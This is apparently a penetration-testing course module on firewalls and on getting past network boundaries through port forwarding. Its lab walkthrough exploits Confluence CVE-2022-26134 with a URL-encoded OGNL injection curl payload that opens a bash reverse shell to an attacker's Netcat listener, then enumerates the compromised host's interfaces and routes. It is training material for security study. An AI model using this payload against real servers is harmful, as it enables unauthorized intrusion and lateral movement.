### Network Segmentation and Traffic Control

As part of the network segmentation process, most network administrators implement controls to limit the flow of traffic into, out from, and across their networks. To enforce these controls, various technologies are deployed throughout the network.

One of the most common technologies used for this purpose is a firewall. Firewalls can be implemented at the endpoint software level. For example, the Linux kernel has built-in firewall capabilities that can be configured using the `iptables` tool suite, while Windows offers the built-in Windows Defender Firewall. Firewalls can also be implemented as features within physical network infrastructure. Administrators may even deploy standalone hardware firewalls to filter all network traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. They can restrict communication to specific hosts and ports, and block certain hosts or subnets from accessing the wider internet. Most firewalls operate based on rules defined by IP addresses and port numbers, but more advanced firewalls use Deep Packet Inspection (DPI) to monitor and control the contents of incoming and outgoing traffic.

### Bypassing Network Boundaries

Network administrators set up boundaries to prevent arbitrary data movement into, out of, and across the network. As an attacker, these boundaries need to be traversed. Strategies such as port redirection and tunneling can help bypass these restrictions.

**Port Redirection** involves modifying the flow of data so that packets sent to one socket are redirected to another. **Tunneling** encapsulates one type of data stream within another, such as transporting HTTP traffic within an SSH connection, making only the SSH traffic visible externally.

In this module, we will introduce port redirection and tunneling techniques through practical examples, starting with the simplest methods and gradually increasing complexity. We will cover SSH tunneling in this module and more advanced methods in later modules.

### Port Forwarding with Linux Tools

#### Learning Objectives:
1. Understand what port forwarding is.
2. Learn when to use port forwarding techniques.
3. Use Socat to set up a port forward in Linux.

#### Port Forwarding Basics

Port forwarding is a fundamental technique used in general-purpose networking. It involves configuring a host to listen on one port and relay all received packets to another destination. For example, a network administrator might set up a port forward to allow access to a web server behind a firewall by configuring the firewall to listen on a specific port and pass all packets to the web server.

Many home routers also provide port forwarding functionality, allowing connections from the internet-facing side of the router to be forwarded to devices within the home network.

#### A Simple Port Forwarding Scenario

Let's consider a scenario where during an assessment, we find a Linux web server running a vulnerable version of Confluence (CVE-2022-26134). We can exploit this vulnerability to gain a reverse shell from the server. The server has two network interfaces: one on the same network as our Kali machine, and another on an internal subnet. In the Confluence configuration file, we find credentials and the IP address and port for a PostgreSQL database instance on a server in the internal subnet. Our goal is to use these credentials to access the database and enumerate further.

The network layout is as follows:

- **WAN (Wide Area Network)**: Our Kali machine is in the WAN, which represents a large corporate internal network or the internet.
- **DMZ (Demilitarized Zone)**: The PostgreSQL database server (PGDATABASE01) is in the DMZ, which acts as a buffer zone between the WAN and internal networks.
- **Confluence Server (CONFLUENCE01)**: This server straddles both the WAN and DMZ, and it is listening on TCP port 8090.

Since our Kali machine is not in the DMZ, we cannot directly route to PGDATABASE01. We need to use port forwarding to connect to the PostgreSQL port on PGDATABASE01 from our Kali machine.

#### Setting Up the Lab Environment

To gain access to CONFLUENCE01, we will leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering the vulnerability, we find a blog post from Rapid7 that includes a cURL command containing a proof-of-concept payload to exploit the vulnerability and return a reverse shell.

```bash
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByNa
me%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash
%27%2C%27-c%27%2C%27bash%20-
i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

We need to understand and modify this payload to fit our environment. The URL path is an OGNL injection payload, which uses Javaâ€™s `ProcessBuilder` class to spawn a Bash interactive reverse shell. We need to change the Confluence server IP to 192.168.50.63 and the Bash interactive shell payload IP and port to a listener on our Kali machine (192.168.118.4:4444).

```bash
curl
http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
bash%27%2C%27-c%27%2C%27bash%20-
i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

With our payload customized, we start a Netcat listener on our Kali machine on TCP port 4444.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

Next, we run the modified cURL command to execute the payload.

```bash
kali@kali:~$ curl
http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
bash%27%2C%27-c%27%2C%27bash%20-
i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

The reverse shell is caught by our listener, and we confirm the shell's privileges with the `id` command.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

We now have a reverse shell from CONFLUENCE01 to our Kali machine. We can start enumerating CONFLUENCE01 using the shell. We check the network interfaces using `ip addr`.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 ::1/128 scope host
valid_lft forever preferred_lft forever
2: ens192:  mtu 1500 qdisc fq_codel state UP group default qlen 1000
link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
valid_lft forever preferred_lft forever
inet6 fe80::250:56ff:fe8a:5446/64 scope link
valid_lft forever preferred_lft forever
3: ens224:  mtu 1500 qdisc fq_codel state UP group default qlen 1000
link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
valid_lft forever preferred_lft forever
inet6 fe80::250:56ff:fe8a:c2c9/64 scope link
valid_lft forever preferred_lft forever
```

The output shows that CONFLUENCE01 has two network interfaces: `ens192` with IP address 192.168.50.63 and `ens224` with IP address 10.4.50.63. We then check the routes using `ip route`.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
default via 192.168.50.254 dev ens192 proto static
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
```

This information will help us set up port forwarding and tunneling to access the PostgreSQL database on PGDATABASE01.